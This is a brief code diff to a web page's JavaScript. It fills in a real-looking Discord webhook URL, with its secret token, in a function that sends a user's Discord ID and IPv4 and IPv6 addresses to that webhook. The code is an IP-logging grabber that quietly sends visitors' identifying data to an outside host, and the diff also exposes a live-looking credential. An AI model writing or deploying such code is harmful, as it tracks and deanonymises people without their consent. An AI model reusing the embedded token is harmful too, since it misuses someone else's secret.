@@ -40,7 +40,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function sendToWebhook(discordID, ipv4, ipv6) {
-    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; 
+    const webhookURL = 'https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy'; 
     const payload = {
       content: `Discord ID: ${discordID}\nIPv4: ${ipv4}\nIPv6: ${ipv6}`
     };
